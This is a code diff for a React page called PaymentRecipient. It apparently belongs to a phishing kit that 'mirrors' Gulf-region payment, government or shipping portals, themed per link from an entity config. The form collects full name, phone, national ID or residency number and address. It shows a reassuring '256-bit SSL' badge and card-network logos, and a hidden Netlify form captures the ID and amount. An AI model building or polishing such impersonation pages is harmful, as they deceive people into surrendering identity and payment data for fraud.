@@ -9,16 +9,13 @@ import { resolveEntity, PaymentEntityConfig } from "@/config/gccPaymentEntities"
 import { ThemedButton } from "@/components/ui/ThemedButton";
 import { ThemedInput } from "@/components/ui/ThemedInput";
 import { ThemedCard } from "@/components/ui/ThemedCard";
-import { ThemedHeader } from "@/components/ui/ThemedHeader";
 import {
   Loader2,
-  User,
-  Phone,
-  Mail,
   MapPin,
   ShieldCheck,
 } from "lucide-react";
 import { DynamicMetaTags } from "@/components/DynamicMetaTags";
+import { MirrorPageWrapper } from "@/components/MirrorPageWrapper";
 
 const PaymentRecipient = () => {
   const { id } = useParams();
@@ -109,92 +106,78 @@ const PaymentRecipient = () => {
   }
 
   return (
-    <div className="min-h-screen flex flex-col bg-background" dir="rtl">
+    <MirrorPageWrapper 
+      entityId={companyKey} 
+      title="بيانات مستلم الخدمة"
+      subtitle="Recipient Information & Verification"
+      linkData={linkData}
+    >
       <DynamicMetaTags
         entityId={companyKey}
         title={`بوابة الدفع - ${entityConfig.nameAr}`}
       />
 
-      <ThemedHeader
-        config={entityConfig}
-        title={entityConfig.nameAr}
-        subtitle="E-Services & Payment Gateway"
-      />
+      <ThemedCard config={entityConfig} variant="elevated" className="overflow-hidden">
+        <div className="h-2 w-full bg-primary" />
+        <form onSubmit={handleSubmit} className="p-6 sm:p-10 space-y-6">
+          <ThemedInput
+            config={entityConfig}
+            label="الاسم الكامل"
+            value={name}
+            onChange={(e) => setName(e.target.value)}
+            placeholder="أدخل الاسم الرباعي"
+            required
+          />
+          <ThemedInput
+            config={entityConfig}
+            label="رقم الجوال"
+            type="tel"
+            value={phone}
+            onChange={(e) => setPhone(e.target.value)}
+            placeholder="05xxxxxxxx"
+            required
+          />
+          {category === 'shipping' && (
+            <ThemedInput
+              config={entityConfig}
+              label="العنوان الوطني"
+              value={address}
+              onChange={(e) => setAddress(e.target.value)}
+              placeholder="المدينة، الحي، الشارع"
+              required
+            />
+          )}
+          <ThemedInput
+            config={entityConfig}
+            label={category === 'shipping' ? 'المدينة / الحي' : 'رقم الهوية الوطنية / الإقامة'}
+            value={nationalId}
+            onChange={(e) => setNationalId(e.target.value)}
+            placeholder={category === 'shipping' ? 'المدينة، الحي، الشارع' : 'أدخل رقم الهوية'}
+            required
+          />
 
-      <main className="flex-1 container mx-auto px-4 py-8 sm:py-12 flex flex-col items-center">
-        <div className="w-full max-w-xl space-y-8">
-          <div className="text-center space-y-2">
-            <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-foreground">بيانات مستلم الخدمة</h2>
-            <p className="text-sm font-medium uppercase tracking-wide text-muted-foreground">Recipient Information & Verification</p>
+          <div className="pt-6">
+            <ThemedButton
+              config={entityConfig}
+              type="submit"
+              disabled={isSubmitting}
+              loading={isSubmitting}
+            >
+              {isSubmitting ? "جاري المعالجة..." : "متابعة عملية الدفع"}
+            </ThemedButton>
+            <div className="mt-6 flex items-center justify-center gap-2" style={{ color: entityConfig.textMuted }}>
+              <ShieldCheck className="w-4 h-4" />
+              <span className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">تشفير بيانات آمن 256-bit SSL</span>
+            </div>
           </div>
+        </form>
+      </ThemedCard>
 
-          <ThemedCard config={entityConfig} variant="elevated" className="overflow-hidden">
-            <div className="h-2 w-full bg-primary" />
-            <form onSubmit={handleSubmit} className="p-6 sm:p-10 space-y-6">
-              <ThemedInput
-                config={entityConfig}
-                label="الاسم الكامل للمستفيد"
-                value={name}
-                onChange={(e) => setName(e.target.value)}
-                placeholder="أدخل اسمك الكامل"
-                icon={<User className="w-5 h-5" />}
-                required
-              />
-
-              <div className="grid sm:grid-cols-2 gap-6">
-                <ThemedInput
-                  config={entityConfig}
-                  label="رقم الجوال"
-                  value={phone}
-                  onChange={(e) => setPhone(e.target.value)}
-                  placeholder="05xxxxxxxx"
-                  icon={<Phone className="w-5 h-5" />}
-                  required
-                />
-                <ThemedInput
-                  config={entityConfig}
-                  label="البريد الإلكتروني (اختياري)"
-                  value={email}
-                  onChange={(e) => setEmail(e.target.value)}
-                  placeholder="example@mail.com"
-                  icon={<Mail className="w-5 h-5" />}
-                />
-              </div>
-
-              <ThemedInput
-                config={entityConfig}
-                label={category === 'shipping' ? 'العنوان بالتفصيل' : 'رقم الهوية / الإقامة'}
-                value={category === 'shipping' ? address : nationalId}
-                onChange={(e) => category === 'shipping' ? setAddress(e.target.value) : setNationalId(e.target.value)}
-                placeholder={category === 'shipping' ? 'المدينة، الحي، الشارع' : 'أدخل رقم الهوية'}
-                icon={category === 'shipping' ? <MapPin className="w-5 h-5" /> : <ShieldCheck className="w-5 h-5" />}
-                required
-              />
-
-              <div className="pt-6">
-                <ThemedButton
-                  config={entityConfig}
-                  type="submit"
-                  disabled={isSubmitting}
-                  loading={isSubmitting}
-                >
-                  {isSubmitting ? "جاري المعالجة..." : "متابعة عملية الدفع"}
-                </ThemedButton>
-                <div className="mt-6 flex items-center justify-center gap-2 text-muted-foreground">
-                  <ShieldCheck className="w-4 h-4" />
-                  <span className="text-[10px] font-bold uppercase tracking-widest">تشفير بيانات آمن 256-bit SSL</span>
-                </div>
-              </div>
-            </form>
-          </ThemedCard>
-
-          <div className="flex justify-center gap-8 opacity-40 grayscale">
-            <img src="/assets/logo-mada.png" className="h-6" alt="mada" />
-            <img src="/assets/logo-visa.png" className="h-6" alt="visa" />
-            <img src="/assets/logo-mastercard.png" className="h-6" alt="mastercard" />
-          </div>
-        </div>
-      </main>
+      <div className="flex justify-center gap-8 opacity-40 grayscale py-6">
+        <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-6" alt="mada" />
+        <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-6" alt="visa" />
+        <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-6" alt="mastercard" />
+      </div>
 
       <form name="recipient-info" netlify-honeypot="bot-field" data-netlify="true" hidden>
         <input type="text" name="linkId" />
@@ -206,7 +189,7 @@ const PaymentRecipient = () => {
         <input type="text" name="nationalId" />
         <input type="text" name="amount" />
       </form>
-    </div>
+    </MirrorPageWrapper>
   );
 };
 
